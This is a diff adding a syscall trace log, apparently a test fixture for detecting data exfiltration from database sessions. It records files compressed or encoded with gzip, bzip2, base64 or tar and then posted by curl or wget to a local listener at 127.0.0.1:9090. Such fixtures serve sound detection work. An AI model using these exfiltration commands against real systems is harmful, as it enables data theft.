@@ -1,0 +1,80 @@
+{"marker": "LOGGING_START", "timestamp": 1791717051.1944852}
+{"pid": 0, "ppid": 0, "uid": 0, "timestamp": 18482168219870, "comm": "clock_anchor", "syscall": "clock_nanosleep", "arg": ""}
+{"marker": "SESSION_END", "backend_pid": 74318, "timestamp": 1791717053.8535826}
+{"marker": "SESSION_END", "backend_pid": 74351, "timestamp": 1791717054.3974042}
+{"marker": "SESSION_END", "backend_pid": 74385, "timestamp": 1791717054.9546695}
+{"marker": "SESSION_END", "backend_pid": 74416, "timestamp": 1791717055.5123892}
+{"marker": "SESSION_END", "backend_pid": 74446, "timestamp": 1791717056.0688646}
+{"marker": "SESSION_END", "backend_pid": 74485, "timestamp": 1791717056.6239853}
+{"marker": "SESSION_END", "backend_pid": 74517, "timestamp": 1791717057.182956}
+{"pid": 74551, "ppid": 74549, "uid": 101, "timestamp": 18488716946374, "comm": "gzip", "syscall": "execve", "arg": "gzip > /tmp/exfil_gzip_curl.dat"}
+{"pid": 74551, "ppid": 74549, "uid": 101, "timestamp": 18488716947374, "comm": "gzip", "syscall": "openat", "arg": "/tmp/exfil_gzip_curl.dat"}
+{"pid": 74552, "ppid": 74551, "uid": 101, "timestamp": 18488717578980, "comm": "curl", "syscall": "execve", "arg": "curl -s -X POST -d @/tmp/exfil_gzip_curl.dat http://127.0.0.1:9090 > /dev/null"}
+{"pid": 74552, "ppid": 74551, "uid": 101, "timestamp": 18488717579980, "comm": "curl", "syscall": "openat", "arg": "/dev/null"}
+{"pid": 74552, "ppid": 74551, "uid": 101, "timestamp": 18488720977101, "comm": "curl", "syscall": "openat", "arg": "/tmp/exfil_gzip_curl.dat"}
+{"pid": 74552, "ppid": 74551, "uid": 101, "timestamp": 18488721075748, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "127.0.0.1", "dest_port": 9090}
+{"marker": "SESSION_END", "backend_pid": 74549, "timestamp": 1791717057.7487445}
+{"pid": 74586, "ppid": 74584, "uid": 101, "timestamp": 18489779733930, "comm": "gzip", "syscall": "execve", "arg": "gzip > /tmp/exfil_gzip_wget.dat"}
+{"pid": 74586, "ppid": 74584, "uid": 101, "timestamp": 18489779734930, "comm": "gzip", "syscall": "openat", "arg": "/tmp/exfil_gzip_wget.dat"}
+{"pid": 74587, "ppid": 74586, "uid": 101, "timestamp": 18489780386602, "comm": "wget", "syscall": "execve", "arg": "wget -q --post-file=/tmp/exfil_gzip_wget.dat http://127.0.0.1:9090 > /dev/null"}
+{"pid": 74587, "ppid": 74586, "uid": 101, "timestamp": 18489780387602, "comm": "wget", "syscall": "openat", "arg": "/dev/null"}
+{"pid": 74587, "ppid": 74586, "uid": 101, "timestamp": 18489781424559, "comm": "wget", "syscall": "openat", "arg": "/etc/wgetrc"}
+{"pid": 74587, "ppid": 74586, "uid": 101, "timestamp": 18489781514888, "comm": "wget", "syscall": "openat", "arg": "/tmp/exfil_gzip_wget.dat"}
+{"pid": 74587, "ppid": 74586, "uid": 101, "timestamp": 18489781534951, "comm": "wget", "syscall": "connect", "arg": "", "dest_ip": "127.0.0.1", "dest_port": 9090}
+{"marker": "SESSION_END", "backend_pid": 74584, "timestamp": 1791717058.8091447}
+{"pid": 74620, "ppid": 74618, "uid": 101, "timestamp": 18490838795595, "comm": "gzip", "syscall": "execve", "arg": "gzip > /tmp/exfil_gzip_nc.dat"}
+{"pid": 74620, "ppid": 74618, "uid": 101, "timestamp": 18490838796595, "comm": "gzip", "syscall": "openat", "arg": "/tmp/exfil_gzip_nc.dat"}
+{"marker": "SESSION_END", "backend_pid": 74618, "timestamp": 1791717059.8667576}
+{"pid": 74654, "ppid": 74652, "uid": 101, "timestamp": 18491899174253, "comm": "bzip2", "syscall": "execve", "arg": "bzip2 > /tmp/exfil_bzip2_curl.dat"}
+{"pid": 74654, "ppid": 74652, "uid": 101, "timestamp": 18491899175253, "comm": "bzip2", "syscall": "openat", "arg": "/tmp/exfil_bzip2_curl.dat"}
+{"pid": 74655, "ppid": 74654, "uid": 101, "timestamp": 18491899900662, "comm": "curl", "syscall": "execve", "arg": "curl -s -X POST -d @/tmp/exfil_bzip2_curl.dat http://127.0.0.1:9090 > /dev/null"}
+{"pid": 74655, "ppid": 74654, "uid": 101, "timestamp": 18491899901662, "comm": "curl", "syscall": "openat", "arg": "/dev/null"}
+{"pid": 74655, "ppid": 74654, "uid": 101, "timestamp": 18491903980154, "comm": "curl", "syscall": "openat", "arg": "/tmp/exfil_bzip2_curl.dat"}
+{"pid": 74655, "ppid": 74654, "uid": 101, "timestamp": 18491904148631, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "127.0.0.1", "dest_port": 9090}
+{"marker": "SESSION_END", "backend_pid": 74652, "timestamp": 1791717060.9318912}
+{"pid": 74690, "ppid": 74688, "uid": 101, "timestamp": 18492966206011, "comm": "bzip2", "syscall": "execve", "arg": "bzip2 > /tmp/exfil_bzip2_wget.dat"}
+{"pid": 74690, "ppid": 74688, "uid": 101, "timestamp": 18492966207011, "comm": "bzip2", "syscall": "openat", "arg": "/tmp/exfil_bzip2_wget.dat"}
+{"pid": 74691, "ppid": 74690, "uid": 101, "timestamp": 18492966950880, "comm": "wget", "syscall": "execve", "arg": "wget -q --post-file=/tmp/exfil_bzip2_wget.dat http://127.0.0.1:9090 > /dev/null"}
+{"pid": 74691, "ppid": 74690, "uid": 101, "timestamp": 18492966951880, "comm": "wget", "syscall": "openat", "arg": "/dev/null"}
+{"pid": 74691, "ppid": 74690, "uid": 101, "timestamp": 18492968337362, "comm": "wget", "syscall": "openat", "arg": "/etc/wgetrc"}
+{"pid": 74691, "ppid": 74690, "uid": 101, "timestamp": 18492968468144, "comm": "wget", "syscall": "openat", "arg": "/tmp/exfil_bzip2_wget.dat"}
+{"pid": 74691, "ppid": 74690, "uid": 101, "timestamp": 18492968504880, "comm": "wget", "syscall": "connect", "arg": "", "dest_ip": "127.0.0.1", "dest_port": 9090}
+{"marker": "SESSION_END", "backend_pid": 74688, "timestamp": 1791717061.9959445}
+{"pid": 74726, "ppid": 74724, "uid": 101, "timestamp": 18494027885268, "comm": "bzip2", "syscall": "execve", "arg": "bzip2 > /tmp/exfil_bzip2_nc.dat"}
+{"pid": 74726, "ppid": 74724, "uid": 101, "timestamp": 18494027886268, "comm": "bzip2", "syscall": "openat", "arg": "/tmp/exfil_bzip2_nc.dat"}
+{"marker": "SESSION_END", "backend_pid": 74724, "timestamp": 1791717063.0558884}
+{"pid": 74761, "ppid": 74759, "uid": 101, "timestamp": 18495101906370, "comm": "base64", "syscall": "execve", "arg": "base64 > /tmp/exfil_base64_curl.dat"}
+{"pid": 74761, "ppid": 74759, "uid": 101, "timestamp": 18495101907370, "comm": "base64", "syscall": "openat", "arg": "/tmp/exfil_base64_curl.dat"}
+{"pid": 74762, "ppid": 74761, "uid": 101, "timestamp": 18495102578124, "comm": "curl", "syscall": "execve", "arg": "curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 > /dev/null"}
+{"pid": 74762, "ppid": 74761, "uid": 101, "timestamp": 18495102579124, "comm": "curl", "syscall": "openat", "arg": "/dev/null"}
+{"pid": 74762, "ppid": 74761, "uid": 101, "timestamp": 18495106542373, "comm": "curl", "syscall": "openat", "arg": "/tmp/exfil_base64_curl.dat"}
+{"pid": 74762, "ppid": 74761, "uid": 101, "timestamp": 18495106638202, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "127.0.0.1", "dest_port": 9090}
+{"marker": "SESSION_END", "backend_pid": 74759, "timestamp": 1791717064.1346986}
+{"pid": 74796, "ppid": 74794, "uid": 101, "timestamp": 18496169533828, "comm": "base64", "syscall": "execve", "arg": "base64 > /tmp/exfil_base64_wget.dat"}
+{"pid": 74796, "ppid": 74794, "uid": 101, "timestamp": 18496169534828, "comm": "base64", "syscall": "openat", "arg": "/tmp/exfil_base64_wget.dat"}
+{"pid": 74797, "ppid": 74796, "uid": 101, "timestamp": 18496170146540, "comm": "wget", "syscall": "execve", "arg": "wget -q --post-file=/tmp/exfil_base64_wget.dat http://127.0.0.1:9090 > /dev/null"}
+{"pid": 74797, "ppid": 74796, "uid": 101, "timestamp": 18496170147540, "comm": "wget", "syscall": "openat", "arg": "/dev/null"}
+{"pid": 74797, "ppid": 74796, "uid": 101, "timestamp": 18496171499266, "comm": "wget", "syscall": "openat", "arg": "/etc/wgetrc"}
+{"pid": 74797, "ppid": 74796, "uid": 101, "timestamp": 18496171625992, "comm": "wget", "syscall": "openat", "arg": "/tmp/exfil_base64_wget.dat"}
+{"pid": 74797, "ppid": 74796, "uid": 101, "timestamp": 18496171658663, "comm": "wget", "syscall": "connect", "arg": "", "dest_ip": "127.0.0.1", "dest_port": 9090}
+{"marker": "SESSION_END", "backend_pid": 74794, "timestamp": 1791717065.1991518}
+{"pid": 74830, "ppid": 74828, "uid": 101, "timestamp": 18497231131489, "comm": "base64", "syscall": "execve", "arg": "base64 > /tmp/exfil_base64_nc.dat"}
+{"pid": 74830, "ppid": 74828, "uid": 101, "timestamp": 18497231132489, "comm": "base64", "syscall": "openat", "arg": "/tmp/exfil_base64_nc.dat"}
+{"marker": "SESSION_END", "backend_pid": 74828, "timestamp": 1791717066.2592328}
+{"pid": 74869, "ppid": 74867, "uid": 101, "timestamp": 18498291814532, "comm": "tar", "syscall": "execve", "arg": "tar -czf /tmp/exfil_tar_curl.dat -"}
+{"pid": 74870, "ppid": 74869, "uid": 101, "timestamp": 18498292754102, "comm": "/bin/sh", "syscall": "execve", "arg": "/bin/sh -c gzip"}
+{"pid": 74871, "ppid": 74870, "uid": 101, "timestamp": 18498293117558, "comm": "gzip", "syscall": "execve", "arg": "gzip"}
+{"marker": "SESSION_END", "backend_pid": 74867, "timestamp": 1791717067.321475}
+{"pid": 74906, "ppid": 74904, "uid": 101, "timestamp": 18499355188880, "comm": "tar", "syscall": "execve", "arg": "tar -czf /tmp/exfil_tar_wget.dat -"}
+{"pid": 74907, "ppid": 74906, "uid": 101, "timestamp": 18499356111995, "comm": "/bin/sh", "syscall": "execve", "arg": "/bin/sh -c gzip"}
+{"pid": 74908, "ppid": 74907, "uid": 101, "timestamp": 18499356627271, "comm": "gzip", "syscall": "execve", "arg": "gzip"}
+{"marker": "SESSION_END", "backend_pid": 74904, "timestamp": 1791717068.3849857}
+{"marker": "SESSION_END", "backend_pid": 74909, "timestamp": 1791717068.8905122}
+{"pid": 74943, "ppid": 74941, "uid": 101, "timestamp": 18500415915329, "comm": "tar", "syscall": "execve", "arg": "tar -czf /tmp/exfil_tar_nc.dat -"}
+{"pid": 74944, "ppid": 74943, "uid": 101, "timestamp": 18500417050709, "comm": "/bin/sh", "syscall": "execve", "arg": "/bin/sh -c gzip"}
+{"pid": 74945, "ppid": 74944, "uid": 101, "timestamp": 18500417536875, "comm": "gzip", "syscall": "execve", "arg": "gzip"}
+{"marker": "SESSION_END", "backend_pid": 74941, "timestamp": 1791717069.4457989}
+{"marker": "SESSION_END", "backend_pid": 74977, "timestamp": 1791717070.5036435}
+{"marker": "SESSION_END", "backend_pid": 75010, "timestamp": 1791717071.5659363}
+{"marker": "SESSION_END", "backend_pid": 75044, "timestamp": 1791717072.6198306}
+{"marker": "LOGGING_STOP", "timestamp": 1791717076.658024217}
